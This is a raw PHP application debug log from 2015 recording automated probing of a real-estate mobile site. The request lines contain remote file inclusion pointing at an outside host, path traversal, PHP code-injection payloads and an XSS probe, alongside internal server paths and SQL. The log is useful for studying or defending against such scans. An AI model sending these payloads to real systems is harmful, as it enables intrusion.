+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.075274s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.075789s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.076258s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.076615s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001960s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.077307s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000708s ]
+
+[ 2015-10-14T12:21:29+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=http%3A%2F%2F120.26.55.211%2Fs.txt
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000584s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000720s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.036070s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000495s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000300s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.062494s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000949s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.063562s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019390s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.083010s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.083579s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.084093s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084457s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002049s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.085154s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001259s ]
+
+[ 2015-10-14T12:21:40+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:21:40+08:00 ] ERR: (ThinkException) 无法加载模块:a_long_name_file_not_exist
+[ 2015-10-14T12:21:40+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=a_long_name_file_not_exist&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000732s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000863s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.017352s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000318s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000222s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.047046s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000611s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047743s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.013480s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.061304s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.061833s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.062473s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.062886s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002411s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.063814s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000752s ]
+
+[ 2015-10-14T12:21:40+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=a_long_name_file_not_exist&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000845s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000973s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.036631s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000441s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000234s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.064829s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002211s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.067114s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025131s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.092361s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.093871s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.095318s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.096598s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005936s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.098401s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001692s ]
+
+[ 2015-10-14T12:21:43+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=a_long_name_file_not_exist
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001329s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001533s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.033790s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.001405s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000213s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.067313s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002208s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.069612s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023085s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.092776s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.094224s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.095602s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.096814s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005520s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.098403s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001605s ]
+
+[ 2015-10-14T12:31:09+08:00 ] 121.42.0.39 /index.php?tplname=..%2f..%2fdynamic%2fstats%2faclicks.cac
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001147s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001333s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.045825s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000223s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.076737s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001995s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.078818s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029902s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.109084s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.110502s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.112060s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.113160s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005424s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.114637s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001797s ]
+
+[ 2015-10-14T12:31:09+08:00 ] 121.42.0.39 /index.php?tplname=..%2f..%2fdynamic%2fstats%2faclicks.cac
+NOTIC: [32] PHP Startup: Unable to load dynamic library 'D:\WebServer\php-5.2.5 (x64)\ext\php_fileinfo.dll' - �Ҳ���ָ����ģ�顣
+ Unknown 第 0 行.
+
+[ 2015-10-14T12:31:09+08:00 ] 121.42.0.39 /index.php?tplname=..%252f..%252fdynamic%252fstats%252faclicks.cac
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001353s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001571s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.030430s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000205s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.070825s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001772s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.072683s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021357s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.094115s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.095134s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.096519s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.097437s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004507s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.098783s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001234s ]
+
+[ 2015-10-14T12:31:09+08:00 ] 121.42.0.39 /index.php?tplname=..%252f..%252fdynamic%252fstats%252faclicks.cac
+NOTIC: [32] PHP Startup: Unable to load dynamic library 'D:\WebServer\php-5.2.5 (x64)\ext\php_fileinfo.dll' - �Ҳ���ָ����ģ�顣
+ Unknown 第 0 行.
+
+[ 2015-10-14T12:31:27+08:00 ] 121.42.0.39 /?q=node&destination=node
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000576s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000769s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.031602s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000438s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.053965s ]
+INFO: [ view_template ] --END-- [ RunTime:0.000746s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.054820s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.016779s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.071633s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.072128s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.072746s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.073086s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.002230s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.073995s ]
+INFO: [ view_end ] --END-- [ RunTime:0.000820s ]
+
+[ 2015-10-14T12:36:26+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T12:36:26+08:00 ] ERR: (ThinkException) 非法操作:${@print(md5(this_is_a_test_string))}
+[ 2015-10-14T12:36:26+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000562s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000692s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:36:26+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000742s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000919s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.019603s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000366s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000227s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.059207s ]
+INFO: [ view_template ] --END-- [ RunTime:0.001845s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.061141s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023719s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.084900s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.086023s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.087119s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.087960s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.004139s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.089135s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001385s ]
+
+[ 2015-10-14T12:36:26+08:00 ] ERR: (ThinkException) 无法加载模块:${@print(md5(this_is_a_test_string))}
+[ 2015-10-14T12:36:40+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000707s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000894s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.038388s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000458s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000309s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.071120s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002266s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.073475s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.034594s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.108149s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.109698s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.111312s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.112614s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006024s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.114273s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001640s ]
+
+[ 2015-10-14T12:36:40+08:00 ] ERR: (ThinkException) 非法操作:${@print(md5(this_is_a_test_string))}\
+[ 2015-10-14T12:36:40+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000567s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000697s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:37:11+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000696s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000856s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.038264s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000407s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000280s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.068522s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002805s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.071445s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026441s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.097943s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.099410s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.100849s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.102116s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005718s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.103759s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001691s ]
+
+[ 2015-10-14T12:38:26+08:00 ] ERR: (ThinkException) 无法加载模块:print(md5(this_is_a_test_string));die();/*
+[ 2015-10-14T12:38:27+08:00 ] ERR: (ThinkException) 非法操作:print(md5(this_is_a_test_string));die();/*
+[ 2015-10-14T12:38:27+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001053s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001196s ]
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  file D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [8] Undefined index:  line D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 62 行.
+NOTIC: [4096] Object of class AgentAction could not be converted to string D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Array to string conversion D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 64 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  class D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+NOTIC: [8] Undefined index:  type D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\ThinkException.class.php 第 63 行.
+
+[ 2015-10-14T12:41:02+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001567s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001707s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.014677s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000398s ]
